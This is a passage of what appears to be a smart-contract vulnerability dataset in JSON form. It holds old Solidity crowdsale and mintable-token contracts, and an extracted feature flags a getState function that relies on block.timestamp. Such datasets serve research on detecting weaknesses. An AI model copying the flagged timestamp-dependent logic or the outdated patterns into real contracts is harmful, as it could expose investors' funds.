ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f50"
  },
  "filename": "8234.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > 